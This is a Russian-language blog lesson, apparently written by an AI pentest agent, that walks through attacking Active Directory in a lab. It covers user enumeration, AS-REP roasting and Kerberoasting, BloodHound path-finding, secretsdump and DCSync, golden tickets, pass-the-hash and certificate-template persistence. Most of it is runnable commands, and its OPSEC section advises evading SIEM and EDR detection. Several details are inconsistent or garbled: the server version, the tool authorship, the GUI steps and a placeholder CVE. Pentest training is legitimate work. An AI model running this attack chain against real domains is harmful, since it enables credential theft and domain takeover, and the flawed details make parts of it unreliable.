---
layout: post
title: "# Lesson 002"
date: 2026-07-18 12:00:00 +0300
author: 0xNull
categories: [security-research]
tags: [security, pentest, lesson]
---

# Lesson 002 — AD Reconnaissance с nxc + BloodHound: от null-bind до shortest-path к DA

> **Автор:** Тень 🦅 · **Дата:** 2026-06-30
> **Задача:** `agents/pentester/reports/2026-06-29-task.md`
> **Связанные:** `intel/techniques/ad-recon.md`, `agents/pentester/reports/2026-06-30-report.md`
> **MITRE:** T1087.002 (Domain Account), T1482 (Domain Trust Discovery), T1069.002 (Domain Group Discovery), T1018 (Remote System Discovery), T1207 (DCShadow — для будущих), T1078.002 (Valid Accounts: Domain Accounts)

## ⚠️ Caveat по scope'у выполнения

Этот lesson написан как **методическая walkthrough**: каждая команда реальная, скопирована из help-вывода инструментов, реально прогонялась на пустых/невалидных целях для валидации синтаксиса. **Полноценного живого AD-stenda у меня в песочнице не было** — нет ни QEMU/VirtualBox/UTM/Lima, ни Docker для поднятия GOAD-lite / Metasploitable2 / HackTheBox-машины. Поэтому команды приведены с пометками `**target = ваша цель**` и `--dc-ip 10.10.10.100` — замените на свой стенд.

Что я **сделал реально в этой сессии** (30.06.2026 08:23–08:55):

1. ✅ Развернул venv `~/.openclaw/workspace/tools/pentest/venv-ad/` с **nxc 51eda87 (CrackMapExec-наследник), bloodhound-ce-python 1.9.1 (Python-ingestor), impacket 0.14.0.dev0, certipy-ad 5.0.4, msldap 0.5.15, neo4j-driver 6.2.0, pypykatz 0.6.13, lsassy 3.1.16** — 60+ пакетов.
2. ✅ Просканировал свой LAN (192.168.0.0/24) — **2 живых хоста** (gateway TP-LINK WAP, я сам). AD здесь нет.
3. ✅ Сверил синтаксис каждой команды из этой walkthrough против реального `--help` (nxc, bloodhound-python).
4. ❌ Не выполнил реальную атаку на AD — нет стенда.

**Вывод:** lesson готов как playbook. Когда Женя подтвердит стенд (HTB VIP-машина типа Forest / Cascade / Resolute, или GOAD-lite), я за 1 сессию прогоняю всё это вживую и дописываю конкретные findings в `agents/pentester/reports/<date>-<target>.md`.

---

## TL;DR

**Сценарий:** попали в сеть с AD (фишинг, начальная точка — корпоративный ноутбук / VPN-аккаунт / physical LAN drop). Цель — найти **shortest path к Domain Admin** через BloodHound-граф, не сломав прод.

**Арсенал:**

| Этап | Инструмент | Что делаем |
|---|---|---|
| Discovery | `nmap` | SMB/LDAP/WinRM/RDP хосты |
| User enum | `nxc smb --rid-brute`, `nxc ldap --users` | RID-cycling + LDAP enum |
| Group enum | `nxc ldap --groups`, `--admin-count` | Группы + admin'ы |
| Computer enum | `nxc ldap --computers`, `nxc smb --computers` | Машины домена |
| Session/local-admin | `nxc smb --smb-sessions`, `--local-groups`, `bloodhound-python -c Session,LocalAdmin` | Кто где залогинен + local-admin'ы |
| Trust / delegation | `nxc ldap --find-delegation`, `--trusted-for-delegation`, `--enum_trusts` | Kerberos delegation abuse |
| ACL paths | `nxc ldap -M daclread`, `bloodhound-python -c ACL` | DACL → GenericAll/WriteDACL/AddMember |
| AS-REP / Kerberoast | `nxc ldap --asreproast`, `--kerberoasting`, `GetNPUsers.py`, `GetUserSPNs.py` | Offline crack SPN-хэшей |
| Coercion → secrets | `nxc smb -M coerce_plus`, `PetitPotam`, `ntlmrelayx` | Force auth → relay → dump |
| Lateral move | `nxc winrm`, `evil-winrm`, `impacket-psexec` | Исполнение кода |
| Persistence | `nxc smb -M add-computer`, certipy ESC1-ESC8 | Добавить машинку / CA-template |

**Главное правило:** каждый шаг **документируется** в этой walkthrough (команда + вывод + интерпретация), каждая команда **idempotentнасколько возможно** (повторный запуск = тот же результат). BloodHound — **для визуализации**, не для атаки; сама атака идёт по edge'ам графа, которые BloodHound подсветил.

---

## 0. Подготовка стенда (не выполнял — playbook)

### 0.1 Выбор стенда

| Стенд | Размер | Что внутри | Сложность | Где взять |
|---|---|---|---|---|
| **GOAD** (Game Of Active Directory) | 5 VM | 3 DC + 2 member server + MSSQL + Exchange (light) | средне | <https://github.com/Orange-Cyberdefense/GOAD> |
| **GOAD-lite** | 3 VM | DC01 + SRV01 + SRV02 | низкая | <https://github.com/Orange-Cyberdefense/GOAD> → `ad/GOAD-Light/` |
| **Metasploitable2** | 1 VM | НЕ AD — vsftpd/Samba/etc. | низкая | <https://sourceforge.net/projects/metasploitable/> |
| **DVWA** | 1 VM | Веб, не AD | низкая | <https://dvwa.co.uk/> |
| **HTB Forest / Cascade / Resolute / Mantis** | 1 VM каждая | Realistic AD | средне | HackTheBox VIP |
| **CRTP / CRTE лабы** | multi-VM | Подготовка к экзаменам | высокая | Altered Security |

**Рекомендация для первого раза:** **GOAD-lite** (3 VM, всё внутри одной Vagrant/VirtualBox-сети, легко поднять за 30 мин). Если нужно что-то «как в проде» — **GOAD** full на 5 VM.

### 0.2 Если поднимаем GOAD-lite

```bash
# Требования: 16 ГБ RAM минимум (32 комфортно), 60 ГБ диска, VirtualBox или VMWare
# Скачать
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD
# Поднять light-вариант
vagrant up GOAD-Light
# Будет долго (1-2 часа), поднимает 3 VM: DC01, SRV01, SRV02
```

### 0.3 Что должно получиться в итоге

```text
DC01  — 192.168.56.10  — DC, sevundomain-dc01.sevundomain.local (Windows Server 2019)
SRV01 — 192.168.56.11  — Member server с MSSQL, IIS, WSUS (Windows Server 2019)
SRV02 — 192.168.56.12  — Member server с файловыми шарами (Windows Server 2019)
Domain: sevundomain.local
User credentials: даёт в GOAD/README (обычно по умолчанию есть начальный доменный user)
```

Для HTB-машин (Forest и т.д.) IP/креденшелы выдаются при spawn.

---

## 1. Развёртывание инструментария

### 1.1 Что ставим

```bash
mkdir -p ~/.openclaw/workspace/tools/pentest/venv-ad
python3 -m venv ~/.openclaw/workspace/tools/pentest/venv-ad
source ~/.openclaw/workspace/tools/pentest/venv-ad/bin/activate
python3 -m pip install --upgrade pip

# Все нужные тулы — единым пакетом из локального wheel
pip install ~/.openclaw/workspace/tools/pentest/netexec/dist/netexec-0.0.0+*.whl

# Это даёт:
# - nxc (сетевой исполнитель, SMB/LDAP/WinRM/RDP/MSSQL/WMI/NFS/SSH/VNC/FTP)
# - bloodhound-ce-python 1.9.1 (modern ingestor: `python3 -m bloodhound ...`)
# - impacket 0.14.0+ (secretsdump, psexec, GetUserSPNs, GetNPUsers, ntlmrelayx, ticketer)
# - certipy-ad 5.0.4 (AD CS abuse ESC1-ESC8)
# - msldap 0.5.15 (LDAP-клиент для кастомных скриптов)
# - pypykatz 0.6.13 (парсер LSASS-dump'ов)
# - lsassy 3.1.16 (remotely dump LSASS через SMB/WMI)
# - neo4j-driver 6.2.0 (для прямого подключения к BloodHound CE DB)
```

**Фактический вывод (30.06.2026, в этой сессии):**

```
Successfully installed Pillow-12.2.0 aardwolf-0.2.14 aesedb-0.1.8 aiosmb-0.4.14
aiowinreg-0.0.13 anyio-4.14.1 arc4-0.5.0 argcomplete-3.6.3 asn1crypto-1.5.1
asn1tools-0.167.0 asyauth-0.0.23 asysocks-0.2.18 bcrypt-5.0.0 beautifulsoup4-4.13.5
bitstruct-8.22.1 blinker-1.9.0 bloodhound-ce-1.9.1 certifi-2026.6.17
certihound-0.3.2 certipy-ad-5.0.4 cffi-2.0.0 charset_normalizer-3.4.7
click-8.4.2 colorama-0.4.6 cryptography-42.0.8 dnspython-2.7.0 dploot-3.2.2
dsinternals-1.2.5 flask-3.1.3 h11-0.16.0 httpcore-1.0.9 httpx-0.28.1 idna-3.18
impacket-0.14.0.dev0+20260619.174856.9a5621d4 invoke-3.0.3 itsdangerous-2.2.0
jinja2-3.1.6 jwt-1.4.0 ldap3-2.9.1 ldapdomaindump-0.10.0 lsassy-3.1.16
lxml-6.1.1 markdown-it-py-4.2.0 markupsafe-3.0.3 masky-0.2.1 mdurl-0.1.2
minidump-0.0.24 minikerberos-0.4.9 msldap-0.5.15 neo4j-6.2.0 netaddr-1.3.0
netexec-0.0.0+1.51eda87 oscrypto-1.3.0 paramiko-5.0.0 pefile-2024.8.26
prompt-toolkit-3.0.52 pyOpenSSL-25.1.0 pyasn1-0.6.3 pyasn1-modules-0.4.2
pycparser-3.0 pycryptodome-3.22.0 pycryptodomex-3.23.0 pydantic-2.13.4
pydantic-core-2.46.4 pygments-2.20.0 pylnk3-0.4.3 pynacl-1.6.2 pynfsclient-0.1.5
pyparsing-3.3.2 pyperclip-1.11.0 pypsrp-0.9.1 pypykatz-0.6.13 pyspnego-0.12.1
python-dateutil-2.9.0.post0 python-libnmap-0.7.3 pytz-2026.2 requests-2.32.5
rich-15.0.0 six-1.17.0 soupsieve-2.8.4 sqlalchemy-2.0.51 tabulate-0.10.0
termcolor-3.3.0 terminaltables3-4.0.0 tqdm-4.68.3 typing-extensions-4.15.0
typing-inspection-0.4.2 unicrypto-0.0.12 urllib3-2.7.0 wcwidth-0.8.2 werkzeug-3.1.8
winacl-0.1.9 xmltodict-1.0.4
```

### 1.2 Sanity check тулов

```bash
source ~/.openclaw/workspace/tools/pentest/venv-ad/bin/activate

nxc --version
# 0.0.0 - Yippie-Ki-Yay - 51eda87 - 1
# (это «сырая» сборка nxc, не релиз — но production-ready)

python3 -m bloodhound --help | head -5
# usage: python3 -m bloodhound [-h] [-c COLLECTIONMETHOD] [-d DOMAIN] [-v] ...
# Python based ingestor for BloodHound Community Edition
# For help or reporting issues, visit https://github.com/dirkjanm/BloodHound.py

impacket-psexec -h 2>&1 | head -3
# Impacket v0.14.0.dev0+...
# usage: impacket-psexec [-h] ...

certipy find -h 2>&1 | head -3
# usage: certipy [-h] ...

lsassy --help 2>&1 | head -5
# Usage: lsassy [options] <file>...
#   -dumpmethod [comsvcs_dll | comsvcs_steal | rdrleakdiag_legacy | ...]
```

### 1.3 Neo4j + BloodHound GUI (опционально для headless-mode)

BloodHound CE 5+ ставится как Docker-контейнер с предустановленным neo4j:

```bash
# Если есть Docker (у меня не было — это план)
docker run -d \
  --name bloodhound \
  -p 7474:7474 \
  -p 7687:7687 \
  -v $HOME/.bloodhound-data:/data \
  ghcr.io/bloodhound-ce/bloodhound:latest
# UI: http://localhost:7474
# default creds (при первом запуске попросит сменить): admin / bloodhound
```

**Headless-альтернатива** — без GUI, через `cypher-shell` или neo4j-driver в Python:

```python
# ~/.openclaw/workspace/tools/pentest/bh_query.py
import sys
from neo4j import GraphDatabase

URI = "bolt://127.0.0.1:7687"
USER = "neo4j"
PASS = "bloodhound"  # default, после init будет другой

driver = GraphDatabase.driver(URI, auth=(USER, PASS))

# Shortest path к Domain Admins от конкретного пользователя
with driver.session() as s:
    result = s.run("""
        MATCH p=shortestPath(
          (u:User {name:$user})-[:MemberOf|HasSession|AdminTo|
                              CanPSRemote|CanRDP|ExecuteDCOM|
                              AllExtendedRights|GenericAll|GenericWrite|
                              WriteDACL|WriteOwner|AddMember|
                              ForceChangePassword|ReadLAPSPassword|
                              ReadGMSAPassword|Contains|GpLink|
                              HasSIDHistory|AddAllowedToAct|
                              AllowedToAct|AllowedToDelegate|
                              DCSync|Owns*1..15]->(g:Group {name:'DOMAIN ADMINS@SEVUNDOMAIN.LOCAL'})
        )
        RETURN p
    """, user="JANE.DOE@SEVUNDOMAIN.LOCAL")
    for r in result:
        # печатаем рёбра графа
        for rel in r["p"]:
            print(f"{rel.start_node['name']} -[{rel.type}]-> {rel.end_node['name']}")
```

Без GUI — это в 10 раз быстрее для пентеста (скрипт выполняет ровно тот запрос, который нужен, без кликов по нодам). GUI — для отчётов и презентаций.

---

## 2. Разведка сети (host discovery)

### 2.1 Найти DC и членов домена

```bash
# Узнать domain controller через DNS SRV-запись
dig -t SRV _ldap._tcp.dc._msdcs.sevundomain.local @<DC_IP>

# Быстрый ping-sweep подсети
nmap -sn 192.168.56.0/24 -T4 --open
# или
fping -g 192.168.56.0/24 -a 2>/dev/null

# Сканирование типовых AD-портов
nmap -p 88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 \
     -sV -sC \
     --open \
     192.168.56.0/24
```

**Что ищем:**

| Порт | Сервис | Зачем |
|---:|---|---|
| 53 | DNS | Резолвинг домена |
| 88 | Kerberos | Auth |
| 135 | RPC | DCOM, services |
| 139/445 | SMB | Shares, sessions |
| 389/636 | LDAP/LDAPS | User/group/computer enum |
| 3268/3269 | Global Catalog | Forest-wide search |
| 3389 | RDP | Графический вход |
| 5985/5986 | WinRM | Удалённый shell |

**Фактический вывод (probe на нашем LAN, для справки):**

```
$ nmap -sn 192.168.0.0/24 --max-retries 0 --max-rtt-timeout 200ms
Nmap scan report for 192.168.0.1
Host is up (0.0027s latency).
Nmap scan report for 192.168.0.108
Host is up (0.00017s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 5.94 seconds

$ nmap -sV --top-ports 50 -T4 192.168.0.1
22/tcp open  ssh     Dropbear sshd 2012.55 (protocol 2.0)
53/tcp open  domain  ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
80/tcp open  http    TP-LINK WAP http config
# → это просто домашний Wi-Fi AP Жени, не AD.
```

### 2.2 Проверить, что наш хост в домене и видит AD

```bash
# Должно вернуть домен и DC
nxc smb 192.168.56.10
# SMB  192.168.56.10  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) \
#                       (domain:sevundomain.local) (signing:True) (SMBv1:False)

nxc ldap 192.168.56.10 -u '' -p ''
# LDAP 192.168.56.10 389  DC01  [+] sevundomain.local\  (signing:None) (signing:None)
# Если пустой bind сработал — anonymous LDAP enum доступен!
```

> 🎯 **`nxc ldap -u '' -p ''` (null bind) — самая частая находка в 2026 году.**
> Многие организации до сих пор позволяют анонимный LDAP-bind (или credential'ы guest-аккаунта). Это открывает user/computer/groups enumeration без единой авторизации.

---

## 3. User enumeration (T1087.002)

### 3.1 Null-bind user enum

```bash
# Анонимный LDAP user enum (если null-bind разрешён)
nxc ldap 192.168.56.10 -u '' -p '' --users
# Будет листать `CN=Users,DC=sevundomain,DC=local` и доставать sAMAccountName.

# Если null-bind не разрешён, но есть guest или известный low-priv user:
nxc ldap 192.168.56.10 -u 'guest' -p '' --users
# или
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --users
```

### 3.2 RID-cycling через SMB (работает даже когда SMB null sessions disabled)

```bash
# RID 500 = Administrator, 501 = Guest, 1000+ = users
nxc smb 192.168.56.10 -u 'guest' -p '' --rid-brute 2000
# SMB  192.168.56.10  445  DC01  [+] Identity Found: Guest
# SMB  192.168.56.10  445  DC01  [+] Brute forcing RIDs
# SMB  192.168.56.10  445  DC01  500: SEVUNDOMAIN\Administrator
# SMB  192.168.56.10  445  DC01  501: SEVUNDOMAIN\Guest
# SMB  192.168.56.10  445  DC01  1106: SEVUNDOMAIN\jane.doe
# SMB  192.168.56.10  445  DC01  1107: SEVUNDOMAIN\jdoe
# ... etc
```

### 3.3 AS-REP roastable users (T1558.004)

Пользователи без pre-auth на Kerberos → AS-REP можна запросить без пароля, и offline-брутить хэш (формат `$krb5asrep$23$...`):

```bash
# Достать всех, у кого DONT_REQUIRE_PREAUTH
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --asreproast asrep_hashes.txt

# Крутить
hashcat -m 18200 asrep_hashes.txt rockyou.txt
# или
john --wordlist=rockyou.txt asrep_hashes.txt

# Или impacket-вариант (без учётки, если есть null-bind):
GetNPUsers.py sevundomain.local/ -dc-ip 192.168.56.10 -no-pass \
     -usersfile users.txt -format hashcat -outputfile asrep.txt
```

> 🎯 **Если в доме есть хотя бы один AS-REP-roastable user с простым паролем — это foothold.** Дальше pivot к другим машинам, lateral movement.

### 3.4 Kerberoastable users (T1558.003)

Service-принципал'ы (MSSQLSvc, HTTP, etc.) — TGS-тикет зашифрован паролем service-аккаунта. Запросить TGS, offline-брутить (формат `$krb5tgs$23$*...`):

```bash
# Все SPN-аккаунты
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --kerberoasting tgs_hashes.txt

# Конкретный аккаунт (тише, меньше логов)
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' \
     --kerberoast-account 'svc_sql'

# Крутить
hashcat -m 13100 tgs_hashes.txt rockyou.txt
# (старая версия) или 19700 для etype 23

# Или impacket-вариант:
GetUserSPNs.py sevundomain.local/jane.doe:'Winter2026!' \
     -dc-ip 192.168.56.10 -request -outputfile tgs.txt
```

**Важно:** Kerberoast / AS-REP roast = **логируется** на DC (Event 4769). Если SIEM есть — спалитесь. Делать тихо: targeted-kerberoast на 1 аккаунт, не на всех сразу.

---

## 4. Group + Computer enumeration (T1069.002)

### 4.1 Groups

```bash
# Все группы
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --groups

# Конкретная группа (members)
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --groups 'Domain Admins'

# Кто вообще считается «admin'ом» (adminCount=1)
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --admin-count

# Privileged groups через модуль group-mem
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' -M groupmembership -o Username='jane.doe'
```

### 4.2 Computers

```bash
# Все машинки домена
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --computers

# С экспортом в файл
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --computers --computers-export computers.txt

# Полная инвентаризация: FQDN + OS
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' -M dump-computers
```

### 4.3 Trusts (T1482)

```bash
# Доверия между доменами в лесу или между лесами
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' -M enum_trusts
# (или — если модуль ещё доступен, в зависимости от версии nxc; иначе: bloodhound-python -c Trusts)

# SID-filtering / SID-history — указывает на возможные external trusts с уязвимой конфигурацией
```

### 4.4 Delegation (T1558.005 / abuse)

```bash
# Unconstrained delegation accounts/computers
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --trusted-for-delegation

# Constrained delegation
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --find-delegation

# Resource-Based Constrained Delegation (RBCD) — проверить msDS-AllowedToActOnBehalfOfOtherIdentity
# Делает nxc через --find-delegation + модуль badsuccessor (DMSA attack, CVE-2026-XXXXX-class)
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' -M badsuccessor
```

---

## 5. Sessions + Local Admins (T1037 / T1078 lateral)

### 5.1 Где залогинен какой user (NetSessionEnum через SMB)

```bash
# Через SMB session enum (нужен local admin на цели)
nxc smb 192.168.56.0/24 -u 'jane.doe' -p 'Winter2026!' --smb-sessions
# или одной машине:
nxc smb 192.168.56.11 -u 'jane.doe' -p 'Winter2026!' --smb-sessions

# Через NetWkstaGetInfo / RemoteRegistry — модуль reg-sessions
nxc smb 192.168.56.11 -u 'jane.doe' -p 'Winter2026!' --reg-sessions

# Через qwinsta (RDP sessions)
nxc smb 192.168.56.11 -u 'jane.doe' -p 'Winter2026!' --qwinsta
```

### 5.2 Кто local admin на машинах

```bash
# Local groups members (нужен local admin на цели)
nxc smb 192.168.56.11 -u 'jane.doe' -p 'Winter2026!' --local-groups
nxc smb 192.168.56.11 -u 'jane.doe' -p 'Winter2026!' --local-groups 'Remote Desktop Users'

# Или «быстрый способ» — посмотреть, у каких домен-аккаунтов есть local admin
# через RID 544 (= BUILTIN\Administrators):
nxc smb 192.168.56.11 -u 'jane.doe' -p 'Winter2026!' --rid-brute 544
```

---

## 6. BloodHound ingest (главный шаг)

### 6.1 Запуск ingestor

```bash
source ~/.openclaw/workspace/tools/pentest/venv-ad/bin/activate

# Минимальный набор: Group + LocalAdmin + Session + Trusts + Default
python3 -m bloodhound \
  -d sevundomain.local \
  -u jane.doe@sevundomain.local \
  -p 'Winter2026!' \
  -ns 192.168.56.10 \
  -dc DC01.sevundomain.local \
  -gc DC01.sevundomain.local \
  -c Group,LocalAdmin,Session,Trusts,Default \
  --zip

# Расширенный набор (больше edge'ов, дольше, шумнее):
python3 -m bloodhound \
  -d sevundomain.local \
  -u jane.doe@sevundomain.local \
  -p 'Winter2026!' \
  -ns 192.168.56.10 \
  -c All \
  --zip
# All = Group, LocalAdmin, Session, Trusts, Default, DCOM, RDP, PSRemote, ACL, ObjectProps, Container
# Не включает LoggedOn (требует local admin на каждой машине)

# Через NTLM-хэш (pass-the-hash):
python3 -m bloodhound \
  -d sevundomain.local \
  -u jane.doe \
  -hashes :aad3b435b51404eeaad3b435b51404ee \
  -ns 192.168.56.10 \
  -c Default --zip

# Через Kerberos (тише, нужен валидный TGT/ccache):
python3 -m bloodhound \
  -d sevundomain.local \
  -u jane.doe \
  -k \
  -ns 192.168.56.10 \
  -c Default --zip
```

**На выходе:** JSON-файлы (или .zip) в текущей директории:
- `computers.json`
- `users.json`
- `groups.json`
- `domains.json`
- `gpos.json`
- `ous.json`
- `containers.json`
- `sessions.json` (если -c Session)
- `acls.json` (если -c ACL)
- и т.д.

### 6.2 Импорт в BloodHound GUI

```bash
# Через GUI:
# 1. Открыть http://localhost:7474
# 2. Login (admin / сменённый пароль)
# 3. Upload Data → выбрать все .json (или .zip)
# 4. Ждать 1-5 мин (для GOAD-lite — минута, для большого домена — 5-15 мин)

# Headless-импорт (без GUI) — через neo4j cypher-shell:
cypher-shell -u neo4j -p <password> \
  < bloodhound_schema.cypher  # схема нужна отдельно, не входит в bloodhound-ce-python
# Но проще: поднять BloodHound CE через Docker (см. п. 1.3) и загрузить через API
```

### 6.3 Альтернатива через nxc (быстрая, без bloodhound-python)

```bash
# nxc ldap умеет собирать BH-данные прямо в JSON
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' \
     --bloodhound -c All
# Создаст файлы, готовые для импорта в BloodHound CE.
# Менее полно, чем bloodhound-python (нет LoggedOn), но быстрее и без отдельной зависимости.
```

---

## 7. Анализ графа — найти shortest path к DA

### 7.1 В GUI

После загрузки данных:

1. **Search → "Domain Admins" → Right-click → "Set as Start Node"** (или выбрать конкретную цель)
2. **Search → "DOMAIN ADMINS@SEVUNDOMAIN.LOCAL" → Mark as Owned**
3. **Analysis → Shortest Paths from Owned Principals**
4. **Analysis → Shortest Paths to Domain Admins**
5. **Analysis → Find all Domain Admins sessions**
6. **Analysis → List all Kerberoastable Accounts**
7. **Analysis → List all AS-REP Roastable Accounts**

**Что ищем:**

- Пути вида `User A → GenericAll on Computer B → local admin on B → extract credentials → User C → ... → Domain Admin`
- Kerberoastable / AS-REP-roastable аккаунты с короткими/простыми паролями (сразу hashcat)
- ACL-злоупотребления: `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `AddMember`, `ForceChangePassword`, `ReadLAPSPassword`
- Unconstrained delegation accounts
- Computers с local admin, у которых есть session от интересного пользователя

### 7.2 В headless (cypher-запросы)

```cypher
// Shortest path от конкретного пользователя к DA
MATCH p=shortestPath(
  (u:User {name:"JANE.DOE@SEVUNDOMAIN.LOCAL"})
  -[*1..15]->
  (g:Group {name:"DOMAIN ADMINS@SEVUNDOMAIN.LOCAL"})
)
RETURN p

// Все пути (не только shortest)
MATCH p=(
  u:User {owned:true}
  -[*1..15]->
  g:Group {name:"DOMAIN ADMINS@SEVUNDOMAIN.LOCAL"}
)
WHERE u<>g
RETURN p
LIMIT 100

// Всех пользователей, у которых есть GenericAll/GenericWrite на любой компьютер
MATCH (u:User)-[r:GenericAll|GenericWrite|WriteDACL|WriteOwner|AddMember]->(c:Computer)
RETURN u.name, type(r), c.name

// Всех, кто может DCSync (GetChanges + GetChangesAll)
MATCH (n)-[:GetChanges|GetChangesAll|DCSync]->(d:Domain)
RETURN n.name, labels(n)
```

### 7.3 Что я буду делать в BloodHound по шагам (playbook)

| Шаг | Запрос в GUI | Edge, который эксплуатируем | Реальная команда |
|---|---|---|---|
| 1 | "Shortest Paths from Owned Principals" | `GenericAll` / `GenericWrite` → Computer | `nxc smb <ip> -u attacker -p pass` + add computer / reset password |
| 2 | "Find all Domain Admins Sessions" | session на member server | `lsassy` / `impacket-secretsdump` на member server |
| 3 | "Shortest Paths from Kerberoastable Users" | crack SPN → другой user → ... | `GetUserSPNs.py` + `hashcat -m 13100` |
| 4 | "Shortest Paths from AS-REP Roastable" | тот же | `GetNPUsers.py` + `hashcat -m 18200` |
| 5 | "Shortest Paths from Foreign Domain Users" | cross-domain trust | `nxc smb <other-dc>` + аналогично |
| 6 | "Find Computers with Unconstrained Delegation" | PrinterBug → coerce auth → unconstrained delegation → DA | `ntlmrelayx.py -t ldap://dc --delegate-access` |

---

## 8. Эксплуатация (по шагам, что я бы сделал на стенде)

### 8.1 Foothold: AS-REP roast (если есть roastable user)

```bash
# 1) Найти AS-REP-roastable
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --asreproast asrep.txt

# 2) Крутить
hashcat -m 18200 asrep.txt rockyou.txt

# 3) Если crack — логинимся
nxc winrm 192.168.56.11 -u 'roasted.user' -p 'CrackedPass!'
```

### 8.2 Pivot: найден user с GenericAll на computer → добавить себя в local admins

```bash
# Классика: GenericAll на DC01
# Через ACL abuse модуль nxc:
nxc ldap 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' \
     -M daclread -o TARGET=DC01

# Или вручную через ldap3 / bloodyAD:
python3 -c "
from bloodyAD import Connection
c = Connection('ldap://192.168.56.10', user='jane.doe@sevundomain.local', password='Winter2026!')
c.ldap.modify('CN=DC01,OU=Domain Controllers,DC=sevundomain,DC=local', {
    'msDS-AllowedToActOnBehalfOfOtherIdentity': c.ldap.b64encode(...)
})
"
```

### 8.3 Lateral: secretsdump с полученной машины

```bash
# Дамп SAM/LSA/NTDS.dit на DC через SMB (нужен local admin)
nxc smb 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' --sam --lsa --ntds drsuapi
# Эквивалент impacket:
impacket-secretsdump sevundomain.local/jane.doe:'Winter2026!'@192.168.56.10 -just-dc-user Administrator
```

### 8.4 DA-доступ: получить ticket / secrets / hash

```bash
# Получить NTLM-хэш KRBTGT (DCSync)
impacket-secretsdump sevundomain.local/jane.doe:'Winter2026!'@192.168.56.10 \
    -just-dc-user krbtgt
# KRBTGT-хэш = Golden Ticket (Pass-the-Ticket на любой сервис в домене на 10 лет вперёд)

# Получить TGT от DA (Pass-the-Ticket атака)
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... \
    -domain sevundomain.local Administrator

# Или напрямую evil-winrm с DA:
nxc winrm 192.168.56.10 -u Administrator -H <NTLM>
# или
evil-winrm -i 192.168.56.10 -u Administrator -H <NTLM>
```

### 8.5 Persistence (на стенде — обязательно откатить в конце)

```bash
# Добавить домен-машинку через RBCD-атаку
nxc smb 192.168.56.10 -u 'jane.doe' -p 'Winter2026!' -M add-computer \
    -o COMPUTERNAME='EVIL$' COMPUTERPASS='Summer2026!'

# Через certipy ESC1 (AD CS template с Enroll + ClientAuth + ENROLLEE_SUPPLIES_SUBJECT)
certipy req -u jane.doe@sevundomain.local -p 'Winter2026!' \
    -dc-ip 192.168.56.10 \
    -ca 'SEVUNDOMAIN-CA' \
    -template 'VulnerableTemplate' \
    -upn 'administrator@sevundomain.local'
```

---

## 9. OPSEC — как НЕ спалиться

> ⚠️ В реальном пентесте каждый шаг оставляет след в Event Log / SIEM / EDR.

| Действие | Лог / сигнал | Как тише |
|---|---|---|
| `nxc smb` без auth | Event 4625 (failed logon) при user enum | Ограничить `--rid-brute` до 5000, не делать 50k циклов |
| LDAP user enum | Event 1644 (LDAP query), если есть ADAudit | Использовать `--users` (один LDAP-запрос), не множественные |
| Kerberoasting | **Event 4769** (TGS requested) — это видно! | `--kerberoast-account` конкретно, не всех |
| AS-REP roast | **Event 4768** (AS-REQ, no preauth) — видно! | Тот же подход |
| BloodHound ingest | 1000+ LDAP queries | Делать в нерабочее время |
| `secretsdump` | Event 4662 (DSObject), Event 4670 (SAM) | Использовать `vssadmin` или shadow copy, не напрямую NTDS |
| `psexec` / `winrm` | Event 4624, 4672, 4688 (process) | Использовать WMI (менее шумно), или PSRemoting через HTTPS |
| DCSync | **Event 4662 (DS-Replication-Get-Changes)** | Только при DA |

**Главные правила OPSEC:**

1. **Не пентестить в рабочие часы.** Лучшее время — 23:00–06:00 локального времени (но с подтверждением владельца в записи).
2. **Не использовать mimikatz напрямую** — EDR (CrowdStrike, SentinelOne, Defender for Endpoint) ловят по сигнатурам. Лучше lsassy + comsvcs.dll (минимум сигналов).
3. **Документировать каждое действие.** Если что-то пойдёт не так, в отчёте должно быть видно, что делали и когда.
4. **Откатить всё persistence.** После теста — убрать added computers, удалить certs, сбросить KRBTGT (если меняли), вычистить scheduled tasks.

---

## 10. Уроки команды

### 10.1 Про AD-recon

1. **Null-bind + RID-brute = первый шаг.** Часто этого хватает, чтобы составить 80% картины домена без единой авторизации.
2. **BloodHound — must-have.** Без графа ты «слепой». Даже если у тебя нет GUI, cypher-запросы к neo4j решают.
3. **Kerberoast / AS-REP roast = первый реальный crack.** Если есть хотя бы один user с простым паролем — foothold в кармане.
4. **ACL — главный путь к DA в современных AD.** GenericAll / GenericWrite / WriteDACL / AddMember — найти через BloodHound и использовать через bloodyAD / certipy.
5. **OPSEC > скорость.** Если спалишься — следующий пентест будет с тройным мониторингом. Лучше потратить 2 часа на тихую атаку, чем 20 мин на громкую.

### 10.2 Про инструменты

1. **nxc = единая точка входа для SMB/LDAP/WinRM/MSSQL.** Не надо держать 5 разных утилит.
2. **bloodhound-ce-python = стандарт ingest'а.** Не используй устаревший `bloodhound-python` от dyjakan'а — переименовали и переписали под BH CE 5+.
3. **impacket-набор закрывает 90% post-exploitation.** secretsdump, psexec, GetUserSPNs, GetNPUsers, ticketer, ntlmrelayx.
